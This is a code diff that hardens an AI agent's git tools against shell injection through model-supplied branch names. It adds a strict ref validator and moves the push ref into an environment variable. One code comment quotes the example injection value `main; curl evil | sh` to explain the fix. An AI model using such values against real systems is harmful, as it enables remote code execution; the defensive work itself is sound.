@@ -561,6 +561,21 @@ async function github(s: AgentServices) {
   return GitHubClient.fromSecret(secret);
 }
 const repoRef = z.string().regex(/^[\w.-]+\/[\w.-]+$/, "owner/repo");
+/**
+ * A git branch name, validated as a ref rather than trusted as text.
+ *
+ * Branch names are supplied by a model and then used to build sandbox commands, so a name like
+ * `main; curl evil | sh` must be impossible, not merely unlikely. This applies git's own ref rules to the
+ * cases that matter (no leading dash, no `..`, no `@{`, no `//`, no control characters or spaces) while the
+ * push and commit paths additionally pass the ref through the environment instead of the command string.
+ */
+const branchName = z
+  .string()
+  .min(1)
+  .max(200)
+  .regex(/^[A-Za-z0-9._/-]+$/, "must contain only letters, digits, dot, slash, dash or underscore")
+  .refine((v) => !v.startsWith("-") && !v.includes("..") && !v.includes("//") && !v.includes("@{"), "must be a valid git branch name")
+  .refine((v) => !v.endsWith("/") && !v.endsWith(".") && !v.endsWith(".lock") && !v.startsWith("/"), "must be a valid git branch name");
 const parseRepo = (full: string) => ({ owner: full.split("/")[0]!, repo: full.split("/")[1]! });
 
 const githubRepos = defineTool({
@@ -598,7 +613,7 @@ const githubRead = defineTool({
 const githubCommit = defineTool({
   name: "github.commit_files",
   description: "Create/update/delete files in a branch with a single atomic commit (creates the branch from the default branch if needed). Use content null to delete.",
-  input: z.object({ repo: repoRef, branch: z.string().min(1), message: z.string().min(3).max(500), files: z.array(z.object({ path: z.string(), content: z.string().nullable() })).min(1).max(50) }),
+  input: z.object({ repo: repoRef, branch: branchName, message: z.string().min(3).max(500), files: z.array(z.object({ path: z.string(), content: z.string().nullable() })).min(1).max(50) }),
   risk: "MEDIUM",
   dimension: "external_write",
   sideEffects: "external",
@@ -703,7 +718,7 @@ const sandboxRead = defineTool({
 const sandboxGitPush = defineTool({
   name: "sandbox.git_push",
   description: "Push the current branch of a repository inside the sandbox to GitHub using the connected account (token never exposed to the model).",
-  input: z.object({ cwd: z.string().min(1), repo: repoRef, branch: z.string().min(1) }),
+  input: z.object({ cwd: z.string().min(1), repo: repoRef, branch: branchName }),
   risk: "MEDIUM",
   dimension: "external_write",
   sideEffects: "external",
@@ -716,7 +731,9 @@ const sandboxGitPush = defineTool({
     if (!sb) return fail("No sandbox for this run yet.");
     const info = await gh.getRepo(parseRepo(repo));
     if (branch === info.default_branch) return fail(`Refusing to push to the default branch ${branch}.`);
-    const res = await sb.exec(["bash", "-lc", `git push "$STEWARD_PUSH_URL" HEAD:refs/heads/${branch} 2>&1 | sed 's#x-access-token:[^@]*@#***@#g'`], { cwd, env: { STEWARD_PUSH_URL: gh.cloneUrl(parseRepo(repo)) }, timeoutMs: 120_000 });
+    // The ref travels in the environment, never in the command text: even a validation bug then cannot turn a
+    // branch name into shell syntax.
+    const res = await sb.exec(["bash", "-lc", `git push "$STEWARD_PUSH_URL" "$STEWARD_PUSH_REF" 2>&1 | sed 's#x-access-token:[^@]*@#***@#g'`], { cwd, env: { STEWARD_PUSH_URL: gh.cloneUrl(parseRepo(repo)), STEWARD_PUSH_REF: `HEAD:refs/heads/${branch}` }, timeoutMs: 120_000 });
     return { ok: res.exitCode === 0, content: `exit ${res.exitCode}\n${res.stdout}${res.stderr}`.replace(/x-access-token:[^@]*@/g, "***@") };
   },
 });
@@ -753,7 +770,7 @@ const deployCreateProject = defineTool({
   input: z.object({
     name: z.string().min(1).max(100),
     repo: repoRef.optional(),
-    branch: z.string().min(1).max(200).optional(),
+    branch: branchName.optional(),
     framework: z.string().max(80).optional(),
     rootDirectory: z.string().max(500).optional(),
   }),
